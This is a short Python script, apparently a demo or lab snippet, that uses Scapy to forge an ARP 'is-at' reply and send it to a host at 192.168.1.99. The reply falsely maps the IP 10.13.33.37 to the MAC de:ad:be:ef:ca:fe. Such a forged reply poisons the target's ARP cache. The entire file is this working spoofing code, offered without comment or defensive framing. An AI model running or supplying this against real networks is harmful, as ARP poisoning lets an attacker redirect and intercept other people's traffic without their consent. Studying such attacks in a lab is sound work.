from scapy.all import ARP, Ether, sendp, srp

target_ip = "192.168.1.99"
target_mac = "74:8f:3c:be:6e:b6"
spoofed_ip = "10.13.33.37"
spoofed_mac = "de:ad:be:ef:ca:fe"

arp_packet = Ether(dst=target_mac)/ARP(op="is-at", psrc=spoofed_ip, pdst=target_ip, hwsrc=spoofed_mac)

sendp(arp_packet, verbose=1)

